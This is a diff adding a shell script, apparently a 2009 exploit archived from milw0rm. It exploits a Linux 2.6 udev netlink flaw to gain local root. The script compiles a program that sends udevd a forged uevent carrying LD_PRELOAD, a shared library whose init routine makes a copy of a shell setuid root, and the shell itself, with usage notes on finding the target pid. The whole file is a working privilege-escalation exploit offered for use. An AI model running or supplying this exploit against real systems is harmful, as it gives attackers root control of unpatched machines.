@@ -1,0 +1,133 @@
+#!/bin/sh
+# Linux 2.6
+# bug found by Sebastian Krahmer
+#
+# lame sploit using LD technique 
+# by kcope in 2009
+# tested on debian-etch,ubuntu,gentoo
+# do a 'cat /proc/net/netlink'
+# and set the first arg to this
+# script to the pid of the netlink socket
+# (the pid is udevd_pid - 1 most of the time)
+# + sploit has to be UNIX formatted text :)
+# + if it doesn't work the 1st time try more often
+#
+# WARNING: maybe needs some FIXUP to work flawlessly
+## greetz fly out to alex,andi,adize,wY!,revo,j! and the gang
+
+cat > udev.c << _EOF
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <sysexits.h>
+#include <wait.h>
+#include <signal.h>
+#include <sys/socket.h>
+#include <linux/types.h>
+#include <linux/netlink.h>
+
+#ifndef NETLINK_KOBJECT_UEVENT
+#define NETLINK_KOBJECT_UEVENT 15
+#endif
+
+#define SHORT_STRING 64
+#define MEDIUM_STRING 128
+#define BIG_STRING 256
+#define LONG_STRING 1024
+#define EXTRALONG_STRING 4096
+#define TRUE 1
+#define FALSE 0
+
+int socket_fd;
+struct sockaddr_nl address;
+struct msghdr msg;
+struct iovec iovector;
+int sz = 64*1024;
+
+main(int argc, char **argv) {
+        char sysfspath[SHORT_STRING];
+        char subsystem[SHORT_STRING];
+        char event[SHORT_STRING];
+        char major[SHORT_STRING];
+        char minor[SHORT_STRING];
+
+        sprintf(event, "add");
+        sprintf(subsystem, "block");
+        sprintf(sysfspath, "/dev/foo");
+        sprintf(major, "8");
+        sprintf(minor, "1");
+
+        memset(&address, 0, sizeof(address));
+        address.nl_family = AF_NETLINK;
+        address.nl_pid = atoi(argv[1]);
+        address.nl_groups = 0;
+
+        msg.msg_name = (void*)&address;
+        msg.msg_namelen = sizeof(address);
+        msg.msg_iov = &iovector;
+        msg.msg_iovlen = 1;
+
+        socket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+        bind(socket_fd, (struct sockaddr *) &address, sizeof(address));
+
+        char message[LONG_STRING];
+        char *mp;
+
+        mp = message;
+        mp += sprintf(mp, "%s@%s", event, sysfspath) +1;
+        mp += sprintf(mp, "ACTION=%s", event) +1;
+        mp += sprintf(mp, "DEVPATH=%s", sysfspath) +1;
+        mp += sprintf(mp, "MAJOR=%s", major) +1;
+        mp += sprintf(mp, "MINOR=%s", minor) +1;
+        mp += sprintf(mp, "SUBSYSTEM=%s", subsystem) +1;
+        mp += sprintf(mp, "LD_PRELOAD=/tmp/libno_ex.so.1.0") +1;
+
+        iovector.iov_base = (void*)message;
+        iovector.iov_len = (int)(mp-message);
+
+        char *buf;
+        int buflen;
+        buf = (char *) &msg;
+        buflen = (int)(mp-message);
+
+        sendmsg(socket_fd, &msg, 0);
+
+        close(socket_fd);
+
+	sleep(10);
+	execl("/tmp/suid", "suid", (void*)0);
+}
+
+_EOF
+gcc udev.c -o /tmp/udev
+cat > program.c << _EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init()
+{
+ setgid(0);
+ setuid(0);
+ unsetenv("LD_PRELOAD");
+ execl("/bin/sh","sh","-c","chown root:root /tmp/suid; chmod +s /tmp/suid",NULL);
+}
+
+_EOF
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+cat > suid.c << _EOF
+int main(void) {
+       setgid(0); setuid(0);
+       execl("/bin/sh","sh",0); }
+_EOF
+gcc -o /tmp/suid suid.c
+cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+/tmp/udev $1
+
+# milw0rm.com [2009-04-20]
